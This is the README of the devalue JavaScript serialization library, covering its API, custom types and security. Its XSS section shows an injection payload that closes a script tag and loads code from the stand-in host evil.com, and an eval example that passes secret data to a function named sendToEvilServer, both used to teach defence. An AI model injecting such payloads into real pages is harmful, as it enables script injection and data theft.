# devalue

Like `JSON.stringify`, but handles

- cyclical references (`obj.self = obj`)
- repeated references (`[value, value]`)
- `undefined`, `Infinity`, `NaN`, `-0`
- regular expressions
- dates
- `Map` and `Set`
- `BigInt`

Try it out [here](https://svelte.dev/repl/138d70def7a748ce9eda736ef1c71239?version=3.49.0).

## Goals:

- Performance
- Security (see [XSS mitigation](#xss-mitigation))
- Compact output

## Non-goals:

- Human-readable output
- Stringifying functions or non-POJOs

## Usage

There are two ways to use `devalue`:

### `uneval`

This function takes a JavaScript value and returns the JavaScript code to create an equivalent value — sort of like `eval` in reverse:

```js
import * as devalue from 'devalue';

let obj = { message: 'hello' };
devalue.uneval(obj); // '{message:"hello"}'

obj.self = obj;
devalue.uneval(obj); // '(function(a){a.message="hello";a.self=a;return a}({}))'
```

Use `uneval` when you want the most compact possible output and don't want to include any code for parsing the serialized value.

### `stringify` and `parse`

These two functions are analogous to `JSON.stringify` and `JSON.parse`:

```js
import * as devalue from 'devalue';

let obj = { message: 'hello' };

let stringified = devalue.stringify(obj); // '[{"message":1},"hello"]'
devalue.parse(stringified); // { message: 'hello' }

obj.self = obj;

stringified = devalue.stringify(obj); // '[{"message":1,"self":0},"hello"]'
devalue.parse(stringified); // { message: 'hello', self: [Circular] }
```

Use `stringify` and `parse` when evaluating JavaScript isn't an option.

### `unflatten`

In the case where devalued data is one part of a larger JSON string, `unflatten` allows you to revive just the bit you need:

```js
import * as devalue from 'devalue';

const json = `{
  "type": "data",
  "data": ${devalue.stringify(data)}
}`;

const data = devalue.unflatten(JSON.parse(json).data);
```

## Custom types

You can serialize and serialize custom types by passing a second argument to `stringify` containing an object of types and their _reducers_, and a second argument to `parse` or `unflatten` containing an object of types and their _revivers_:

```js
class Vector {
	constructor(x, y) {
		this.x = x;
		this.y = y;
	}

	magnitude() {
		return Math.sqrt(this.x * this.x + this.y * this.y);
	}
}

const stringified = devalue.stringify(new Vector(30, 40), {
	Vector: (value) => value instanceof Vector && [value.x, value.y]
});

console.log(stringified); // [["Vector",1],[2,3],30,40]

const vector = devalue.parse(stringified, {
	Vector: ([x, y]) => new Vector(x, y)
});

console.log(vector.magnitude()); // 50
```

If a function passed to `stringify` returns a truthy value, it's treated as a match.

You can also use custom types with `uneval` by specifying a custom replacer:

```js
devalue.uneval(vector, (value, uneval) => {
	if (value instanceof Vector) {
		return `new Vector(${value.x},${value.y})`;
	}
}); // `new Vector(30,40)`
```

Note that any variables referenced in the resulting JavaScript (like `Vector` in the example above) must be in scope when it runs.

## Error handling

If `uneval` or `stringify` encounters a function or a non-POJO, it will throw an error. You can find where in the input data the offending value lives by inspecting `error.path`:

```js
try {
	const map = new Map();
	map.set('key', function invalid() {});

	uneval({
		object: {
			array: [map]
		}
	});
} catch (e) {
	console.log(e.path); // '.object.array[0].get("key")'
}
```

## XSS mitigation

Say you're server-rendering a page and want to serialize some state, which could include user input. `JSON.stringify` doesn't protect against XSS attacks:

```js
const state = {
	userinput: `</script><script src='https://evil.com/mwahaha.js'>`
};

const template = `
<script>
  // NEVER DO THIS
  var preloaded = ${JSON.stringify(state)};
</script>`;
```

Which would result in this:

```html
<script>
	// NEVER DO THIS
	var preloaded = {"userinput":"
</script>
<script src="https://evil.com/mwahaha.js">
	"};
</script>
```

Using `uneval` or `stringify`, we're protected against that attack:

```js
const template = `
<script>
  var preloaded = ${uneval(state)};
</script>`;
```

```html
<script>
	var preloaded = {
		userinput:
			"\\u003C\\u002Fscript\\u003E\\u003Cscript src='https:\\u002F\\u002Fevil.com\\u002Fmwahaha.js'\\u003E"
	};
</script>
```

This, along with the fact that `uneval` and `stringify` bail on functions and non-POJOs, stops attackers from executing arbitrary code. Strings generated by `uneval` can be safely deserialized with `eval` or `new Function`:

```js
const value = (0, eval)('(' + str + ')');
```

## Other security considerations

While `uneval` prevents the XSS vulnerability shown above, meaning you can use it to send data from server to client, **you should not send user data from client to server** using the same method. Since it has to be evaluated, an attacker that successfully submitted data that bypassed `uneval` would have access to your system.

When using `eval`, ensure that you call it _indirectly_ so that the evaluated code doesn't have access to the surrounding scope:

```js
{
	const sensitiveData = 'Setec Astronomy';
	eval('sendToEvilServer(sensitiveData)'); // pwned :(
	(0, eval)('sendToEvilServer(sensitiveData)'); // nice try, evildoer!
}
```

Using `new Function(code)` is akin to using indirect eval.

## See also

- [lave](https://github.com/jed/lave) by Jed Schmidt
- [arson](https://github.com/benjamn/arson) by Ben Newman. The `stringify`/`parse` approach in `devalue` was inspired by `arson`
- [oson](https://github.com/KnorpelSenf/oson) by Steffen Trog
- [tosource](https://github.com/marcello3d/node-tosource) by Marcello Bastéa-Forte
- [serialize-javascript](https://github.com/yahoo/serialize-javascript) by Eric Ferraiuolo
- [jsesc](https://github.com/mathiasbynens/jsesc) by Mathias Bynens
- [superjson](https://github.com/blitz-js/superjson) by Blitz
- [next-json](https://github.com/iccicci/next-json) by Daniele Ricci

## License

[MIT](LICENSE)
